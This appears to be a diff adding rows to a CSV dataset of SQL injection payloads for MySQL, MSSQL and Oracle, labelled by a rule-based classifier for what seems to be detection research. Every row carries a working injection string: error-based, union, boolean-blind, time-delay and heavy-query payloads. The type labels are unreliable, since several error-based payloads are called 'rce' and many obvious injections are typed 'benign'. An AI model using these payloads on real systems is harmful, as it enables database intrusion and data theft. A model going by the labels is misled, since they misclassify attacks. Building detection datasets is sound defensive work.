@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+7710,"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+7711,"1"" where 9173 = 9173 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
+7712,"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,5734 = 5734 or detected — boolean_blind injection (priority 8) on generic,rule-based
+7713,1 ) where 3030 = 3030,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7714,-5854 ) ) ) union all select 5645#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7715,"-6720' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'enfe' like 'enfe",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
+7716,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
+7717,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+7718,"1%"" and 2805 = 1345",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7719,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'zglq' = 'zglq",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+7720,"1"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7721,"1"" ) as pwvu where 8267 = 8267",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7722,1%' ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7723,"1 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7724,"( select ( case when ( 4232 = 4232 ) then ( select benchmark ( 5000000,md5 ( 0x6b637544 ) ) ) else 4232* ( select 4232 from mysql.db ) end ) )",1,,rce,generic,0.95,0x6b637544 detected — rce injection (priority 1) on generic,rule-based
+7725,"-7939"" ) or 3958 = 6909",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7726,"1%' ) ) ) union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+7727,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'zwyx' = 'zwyx,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7728,-3136%' ) or 3400 = 6002,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7729,"1"" ) as zjwu where 9963 = 9963 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
+7730,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'krvo' like 'krvo,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7731,1'|| ( select 'tjzy' where 3037 = 3037,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7732,"1'+ ( select 'vkis' where 3712 = 3712 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7733,1' ) as fyib where 9246 = 9246,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7734,1 and 2620 = 2175,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7735,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'clcf' = 'clcf,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7736,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+7737,"1"" ) where 7228 = 7228",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7738,1'|| ( select 'qdkb' where 4331 = 4331,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+7739,1'|| ( select 'kyhs' from dual where 9491 = 9491,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
